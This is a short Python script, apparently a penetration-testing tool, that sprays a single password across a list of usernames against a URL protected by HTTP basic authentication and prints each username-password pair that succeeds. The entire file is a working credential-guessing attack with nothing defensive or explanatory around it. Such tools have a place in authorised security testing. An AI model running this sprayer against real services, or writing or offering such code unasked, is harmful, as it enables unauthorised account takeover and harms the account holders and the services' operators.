import requests
import sys
import os

class Sprayer:
    def __init__(self, url):
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.url = url
        
    def load_users(self, userfile):
        self.users = []
        lines = open(userfile, 'r').readlines()
        for line in lines:
            self.users.append(line.strip())
        print(f"[*] Loaded {len(self.users)} users from {userfile}")
        
    def spray(self, password, url):
        print(f"[*] Trying password: {password}")
        count = 0
        for user in self.users:
            response = requests.get(url, auth=(user, password))
            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
                print(f"\t [+] Valid credentials found! \t {user}: {password}")
                count += 1
                continue
        print(f"[*] Finished spraying with password: {password} \n \t [+] Found {count} valid credentials")
        
def main():
    if len(sys.argv) != 4:
        print("Usage: python3 sprayer.py <url> <userfile> <password>")
        sys.exit(1)

    url = sys.argv[1]
    userfile = sys.argv[2]
    password = sys.argv[3]

    if not os.path.isfile(userfile):
        print(f"[-] User file {userfile} does not exist.")
        sys.exit(1)

    sprayer = Sprayer(url)
    sprayer.load_users(userfile)
    sprayer.spray(password, url)
    
if __name__ == "__main__":
    main()